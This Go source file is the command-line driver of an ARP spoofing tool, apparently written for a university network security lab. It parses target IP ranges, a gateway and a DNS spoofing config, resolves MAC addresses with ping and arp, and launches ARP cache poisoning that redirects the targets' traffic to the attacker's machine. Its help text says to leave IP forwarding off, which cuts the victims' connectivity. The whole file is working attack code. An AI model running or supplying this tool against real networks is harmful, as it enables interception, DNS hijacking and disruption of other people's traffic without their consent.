package main

import (
	"arpZebra/arpzebra"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"time"

	"github.com/malfunkt/iprange"
	yaml "gopkg.in/yaml.v2"
)

var (
	flagInterface    = flag.String("interface", "wlp5s0", `本机网络接口`)
	flagTarget       = flag.String("target", "", `目标主机。 "1.2.3.4" 或者 "1.2.3.0/24" 或者 "1.2.3-7.4-12" 或者 "1.2.3.*" 或者前面几种的集合 "1.2.3.4, 1.2.3.0/24, ..."`)
	flagWaitInterval = flag.Float64("wait", 2.0, `每次广播之间等待时间，单位是秒 必须大于 0.1`)
	flagDNSConfig    = flag.String("dnscfg", "", `DNS欺骗配置文件，配置要对哪些域名欺骗`)
	flagGateWay      = flag.String("gateway", "192.168.1.1", `网关的IP地址`)
	flagHelp         = flag.Bool("help", false, `打印本使用方法`)
)

func main() {
	flag.Parse()

	if *flagHelp {
		fmt.Println("网络安全第三次实验：ARP欺骗. 152201 第二组.")
		fmt.Println("该代码欺骗局域网中指定的目标")
		fmt.Println("利用ARP协议，将特制的ARP包发送到指定目标主机，篡改目标的缓存表，把目标之间所有流量都转到我电脑上")
		fmt.Println("")
		// fmt.Println("在此之前Linux要启用IP转发（搞过软路由的应该秒懂），可以很大程度减小被发现的几率：sysctl -w net.ipv4.ip_forward=1")
		fmt.Println("切记不要打开Linux内核自带的IP转发功能。执行“sysctl -w net.ipv4.ip_forward=0”关闭该功能")
		fmt.Println("")
		fmt.Println("Usage: ")
		fmt.Println(os.Args[0], "[-interface <interface>] -target <target host>")
		fmt.Println("")
		flag.PrintDefaults()
		os.Exit(0)
	}

	if *flagWaitInterval < 0.1 {
		*flagWaitInterval = 0.1
	}

	if *flagTarget == "" {
		log.Fatal("无效的攻击目标")
	}

	// 停止信号
	stop := make(chan struct{}, 1)

	// 新建ARP攻击对象
	Zebra, err := arpzebra.NewARPZebra(*flagInterface, time.Duration(*flagWaitInterval*1000.0)*time.Millisecond, stop)
	if err != nil {
		log.Fatal(err)
	}
	defer Zebra.Close()

	// 解析DNS配置文件
	if *flagDNSConfig != "" {
		data, err := ioutil.ReadFile(*flagDNSConfig)

		if err != nil {
			log.Fatalf("读取DNS欺骗配置文件出错：%s\n", err)
		}
		if err = yaml.Unmarshal(data, Zebra); err != nil {
			log.Fatalf("解析DNS欺骗配置文件出错：%s\n", err)
		}
	}

	// 解析目标ip列表
	addrRange, err := iprange.ParseList(*flagTarget)
	if err != nil {
		log.Fatal("目标地址格式错误")
	}
	// 展开目标地址
	targetAddrs := addrRange.Expand()
	if len(targetAddrs) == 0 {
		log.Fatalf("无法获得有效的攻击目标")
	}

	// 获取目标的MAC地址
	for _, ip := range targetAddrs {
		// 将这些地址的mac记录到本地
		if mac, err := doARPLookup(ip); err != nil {
			log.Fatal("无法获得目标MAC地址: ", err)
		} else {
			Zebra.Add(ip, mac)
			log.Print("目标", ip, "的MAC为:", mac)
		}
	}

	// 获得网关的mac地址
	if mac, err := doARPLookup(net.ParseIP(*flagGateWay)); err != nil {
		log.Fatal("无法获得目标MAC地址: ", err)
	} else {
		Zebra.GatewayMAC = mac
		log.Print("网关", *flagGateWay, "的MAC为:", mac)
	}

	// 等待Interrupt信号 Ctrl+C
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for {
			select {
			case <-c:
				log.Println("停止攻击线程……")
				close(stop)
				return
			}
		}
	}()

	// 开始攻击
	Zebra.Run()
	//<-stop

	os.Exit(0)
}

// 查询某个地址的MAC
func doARPLookup(ip net.IP) (net.HardwareAddr, error) {
	// 先ping目的ip，使其发送ARP广播包，并将目的ip对应的MAC加入本机ARP缓存中
	ping := exec.Command("ping", "-c1", "-t1", ip.String())
	ping.Run()
	ping.Wait()

	// 查询地ARP缓存
	cmd := exec.Command("arp", "-an", ip.String())
	out, err := cmd.Output()
	if err != nil {
		return nil, errors.New("ARP缓存表没有任何条目")
	}

	// ? (192.168.1.1) at 74:c3:30:ba:79:1c [ether] on wlp5s0
	lineMatch := regexp.MustCompile(`\?\s+\(([0-9\.]+)\)\s+at\s+([0-9a-f:]+).+on\s+([^\s]+)`)
	// 匹配ARP缓存条目
	matches := lineMatch.FindAllStringSubmatch(string(out), 1)

	if len(matches) > 0 && len(matches[0]) > 3 {
		//ipAddr := net.ParseIP(matches[0][1])
		fmt.Println(matches[0][2])
		macAddrString := matches[0][2]

		macAddr, err := net.ParseMAC(macAddrString)
		if err != nil {
			return nil, fmt.Errorf("解析MAC失败：%v", err)
		}

		return macAddr, nil
	}
	return nil, errors.New("ARP查询失败")
}
